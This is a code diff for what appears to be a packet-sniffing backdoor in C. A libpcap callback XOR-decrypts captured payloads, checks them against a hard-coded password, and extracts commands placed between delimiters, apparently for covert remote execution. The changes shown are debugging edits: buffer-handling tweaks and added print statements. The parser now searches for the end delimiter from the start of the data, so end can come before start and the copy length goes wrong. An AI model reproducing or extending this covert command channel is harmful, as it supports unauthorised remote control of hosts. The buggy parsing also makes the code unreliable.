@@ -187,7 +187,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	/* Decrypt the payload */
 	iSeed(xor_key, 1);
 	decrypted = xor_cipher((char *)payload, size_payload);
-	
+
 	memset(password, 0, sizeof(password));
 	if(sscanf(decrypted, "%s %d", password, &mode) < 0)
 	{
@@ -195,7 +195,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 		return;
 	}
 	command = malloc((PKT_SIZE + 1) * sizeof(char));
-	datalen = parse_cmd(command, decrypted);
+	datalen = parse_cmd(command, decrypted, size_payload);
 
 	if(mode == SERVER_MODE && (strcmp(password, PASSWORD) == 0))
 	{
@@ -288,12 +288,13 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 -- 
 -- NOTES: extracts data between delimiters 
 ----------------------------------------------------------------------------------------------------------------------*/
-int parse_cmd(char * command, char * data)
+int parse_cmd(char * command, char * data, int size)
 {
 	char * start, * end;
 	/*char * */
 	
-
+	printf("Data: %s\n", data);
+	printf("Size: %d\n", size);
 	/* Point to the first occurance of pre-defined command string */
 	start = strstr(data, CMD_START);
 
@@ -302,10 +303,17 @@ int parse_cmd(char * command, char * data)
 	start += strlen(CMD_START);
 
 	/* Find the command end string, starting from the start pointer */
-	end = strstr(start, CMD_END);
+	//if((end = strstr(start, CMD_END)) == NULL)
+	
+
+	if((end = memmem(data, size, CMD_END, strlen(CMD_END))) == NULL)
+	{
+		fprintf(stderr, "End Command not found\n");
+		exit(1);
+	}
 
 	memset(command, 0, PKT_SIZE);
-	strncpy(command, start, (end - start));
+	memcpy(command, start, (end - start));
 
 	return end-start;
 }
